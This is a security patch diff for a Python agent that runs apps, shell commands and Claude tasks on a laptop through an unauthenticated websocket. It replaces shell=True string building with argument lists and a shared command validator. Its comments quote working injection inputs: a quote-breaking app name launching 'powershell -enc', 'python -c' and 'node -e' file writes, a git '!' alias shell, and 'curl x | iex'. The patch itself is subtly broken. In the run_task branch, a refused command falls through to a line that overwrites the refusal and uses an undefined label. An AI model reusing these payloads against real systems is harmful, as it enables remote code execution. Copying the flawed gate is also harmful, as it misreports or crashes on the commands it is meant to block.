@@ -301,10 +301,15 @@ def do_open_app(args: dict) -> str:
     if not app:
         return "Error: no app_name."
     if os.name == "nt":
-        r = subprocess.run(f'start "" "{app}"', shell=True, capture_output=True, text=True, timeout=15)
-        if r.returncode != 0:
-            err = (r.stderr or r.stdout or "launch failed").strip()
-            return f"Couldn't open {app} on the laptop: {err[:150]}"
+        # os.startfile is the Win32 shell-execute API directly: no cmd.exe, nothing re-parses
+        # the string. The old form interpolated an attacker-controlled name into
+        # `start "" "{app}"` under shell=True, so app_name = 'x" & powershell -enc ... & rem "'
+        # broke out of the quotes and ran anything — reachable from the unauthenticated /ws
+        # via remote_device_command.
+        try:
+            os.startfile(app)
+        except Exception as e:
+            return f"Couldn't open {app} on the laptop: {str(e)[:150]}"
     else:
         subprocess.Popen([app])
     return f"Opened {app}."
@@ -320,61 +325,60 @@ def do_open_url(args: dict) -> str:
     return f"Opened {url} in the browser."
 
 
-def do_run_command(args: dict) -> str:
-    import shlex
-    cmd_str = args.get("command", "").strip()
-    if not cmd_str:
-        return "Error: no command."
+def validate_command(cmd_str: str):
+    """Shared gate: returns (tokens, None) if safe to run, else (None, refusal_reason).
 
-    # 1. Reject shell feature operators (pipes, redirects, command chaining)
+    SECURITY 2026-08-01. This validation used to live INSIDE do_run_command, which meant
+    `run_task` and `claude_task` had none of it: handle() intercepts those two actions BEFORE
+    the ACTIONS lookup and shelled them out with subprocess(shell=True), guarded only by an
+    8-item substring blocklist (del/rmdir/rm/format/diskpart/shutdown/reg delete/mkfs). So
+    powershell, curl|iex, python -c and every redirect this function refuses were reachable
+    through a different action name on the same socket. One frame to the unauthenticated /ws
+    was arbitrary shell on Master's laptop. A guard one caller can walk around is not a guard.
+    """
+    import shlex
+    cmd_str = (cmd_str or "").strip()
+    if not cmd_str:
+        return None, "Error: no command."
     for op in SHELL_OPERATORS:
         if op in cmd_str:
-            return f"Refused: Command uses shell feature '{op}' (pipes, redirects, chained commands) which are disallowed for safety."
-
-    # 2. Tokenize command into list
+            return None, f"Refused: Command uses shell feature '{op}' (pipes, redirects, chained commands) which are disallowed for safety."
     try:
         tokens = shlex.split(cmd_str)
     except Exception as e:
-        return f"Refused: Invalid command syntax: {e}"
-
+        return None, f"Refused: Invalid command syntax: {e}"
     if not tokens:
-        return "Error: empty command."
-
-    # 3. Check executable against allowlist
+        return None, "Error: empty command."
     exe_token = tokens[0]
     exe_name = os.path.basename(exe_token).lower()
     allowed_set = _get_active_allowlist()
-
     if exe_name not in allowed_set and exe_token.lower() not in allowed_set:
-        return f"Refused: Executable '{exe_token}' is not in the allowed commands list. Allowed: {sorted(list(allowed_set))}"
-
-    # 3b. AN ALLOWLIST OF INTERPRETERS IS NOT A RESTRICTION.
-    # python, node, npm and git are general-purpose: allowing them allows anything, just
-    # written in another language. Verified 2026-07-29 against the allowlist as first
-    # shipped — each of these RAN and really created the file:
-    #     python -c "open(path,'w').write('pwned')"
-    #     node -e "require('fs').writeFileSync(path,'pwned')"
-    #     git -c alias.x="!echo hi" x        <- git aliases beginning with ! run a shell
-    # The earlier test only tried obviously-named destructive binaries (del, format,
-    # diskpart), so it passed 15/15 while arbitrary execution was wide open.
-    # Scripts stay allowed — the build-log collector is `python <script> --days 1 --json`,
-    # and that is the whole reason run_command exists — but INLINE CODE does not.
+        return None, f"Refused: Executable '{exe_token}' is not in the allowed commands list. Allowed: {sorted(list(allowed_set))}"
     _EVAL_FLAGS = {
         "python": {"-c", "-m"}, "python.exe": {"-c", "-m"},
         "py": {"-c", "-m"}, "py.exe": {"-c", "-m"},
         "node": {"-e", "--eval", "-p", "--print"}, "node.exe": {"-e", "--eval", "-p", "--print"},
-        "git": {"-c"}, "git.exe": {"-c"},          # git -c alias.x='!sh' is shell execution
+        "git": {"-c"}, "git.exe": {"-c"},
     }
     _banned = _EVAL_FLAGS.get(exe_name, set())
     for tok in tokens[1:]:
         if tok.lower() in _banned:
-            return (f"Refused: '{exe_name} {tok}' runs inline code, which is arbitrary "
-                    f"execution wearing an allowed name. Put it in a script file and run "
-                    f"that instead.")
-
-    # 4. Handle Windows builtins (echo, dir, type) safely via cmd.exe /c
+            return None, (f"Refused: '{exe_name} {tok}' runs inline code, which is arbitrary "
+                          f"execution wearing an allowed name. Put it in a script file and run "
+                          f"that instead.")
     if os.name == "nt" and exe_name in {"echo", "dir", "type"}:
         tokens = ["cmd.exe", "/c"] + tokens
+    return tokens, None
+
+
+def do_run_command(args: dict) -> str:
+    cmd_str = args.get("command", "").strip()
+    if not cmd_str:
+        return "Error: no command."
+
+    tokens, refusal = validate_command(cmd_str)
+    if refusal:
+        return refusal
 
     # Execute with shell=False
     try:
@@ -399,11 +403,14 @@ def do_claude_code(args: dict) -> str:
         os.path.expanduser("~"), "OneDrive", "Desktop", "my Ai")
     if not os.path.isdir(workdir):
         workdir = os.path.expanduser("~")
+    # argv + CREATE_NEW_CONSOLE gives the same visible window without a shell. The old form
+    # interpolated `task` into a shell string, so a task containing `&` or `|` started a
+    # second command on Master's laptop.
+    _newconsole = getattr(subprocess, "CREATE_NEW_CONSOLE", 0)
     if task:
-        subprocess.Popen(f'start "Claude Code (via Mizune)" cmd /k claude "{task}"',
-                         shell=True, cwd=workdir)
+        subprocess.Popen(["claude", task], cwd=workdir, creationflags=_newconsole)
         return f"Claude Code opened on the laptop (in {workdir}) with task: {task[:120]}"
-    subprocess.Popen('start "Claude Code (via Mizune)" cmd /k claude', shell=True, cwd=workdir)
+    subprocess.Popen(["claude"], cwd=workdir, creationflags=_newconsole)
     return f"Claude Code opened on the laptop (in {workdir})."
 
 
@@ -425,7 +432,11 @@ async def run_background_task(ws, label: str, cmd: str, cwd=None, timeout=1800):
     walk away, get an honest report."""
     def work():
         try:
-            r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
+            # shell=False + a token list. This was shell=True with a raw string, which is what
+            # made run_task arbitrary execution: every operator do_run_command refuses (pipes,
+            # redirects, chaining) was live here. Callers now pass an already-validated list.
+            _argv = cmd if isinstance(cmd, (list, tuple)) else [cmd]
+            r = subprocess.run(list(_argv), shell=False, capture_output=True, text=True,
                                timeout=timeout, cwd=cwd)
             out = (r.stdout + "\n" + r.stderr).strip()
             status = "succeeded" if r.returncode == 0 else f"FAILED (exit {r.returncode})"
@@ -448,13 +459,16 @@ async def handle(ws, msg: dict):
     if action in ("run_task", "claude_task"):
         a = msg.get("args") or {}
         if action == "claude_task":
-            task = str(a.get("task") or a.get("command") or "").strip().replace('"', "'")
+            task = str(a.get("task") or a.get("command") or "").strip()
             if not task:
                 result = "Error: no task given."
             else:
                 cwd = a.get("project") if a.get("project") and os.path.isdir(str(a.get("project"))) else \
                     os.path.join(os.path.expanduser("~"), "OneDrive", "Desktop", "my Ai")
-                cmd = f'claude -p "{task}"'
+                # argv list, shell=False: the prompt is a single argument, so no quoting
+                # trick inside it can start a second command. The old form built a shell
+                # string and merely swapped double quotes for single ones.
+                cmd = ["claude", "-p", task]
                 label = a.get("label") or task[:60]
                 asyncio.create_task(run_background_task(ws, label, cmd, cwd=cwd))
                 result = f"Started Claude on the laptop working on: {label}. I'll report when it finishes."
@@ -462,11 +476,16 @@ async def handle(ws, msg: dict):
             cmd = str(a.get("command") or "").strip()
             if not cmd:
                 result = "Error: no command."
-            elif any(d in cmd.lower() for d in DANGEROUS):
-                result = f"BLOCKED for safety: '{cmd}'."
             else:
-                label = a.get("label") or cmd[:60]
-                asyncio.create_task(run_background_task(ws, label, cmd))
+                # SAME gate as do_run_command. Previously this was only the DANGEROUS
+                # substring blocklist, so `powershell -enc ...` and `curl x | iex` sailed
+                # through an action that then ran with shell=True.
+                _tokens, _refusal = validate_command(cmd)
+                if _refusal:
+                    result = _refusal
+                else:
+                    label = a.get("label") or cmd[:60]
+                    asyncio.create_task(run_background_task(ws, label, _tokens))
                 result = f"Started background task: {label}. I'll report when it finishes."
         print(f"[agent] {action} -> {result[:100]}")
         await ws.send(json.dumps({"type": "device_result",
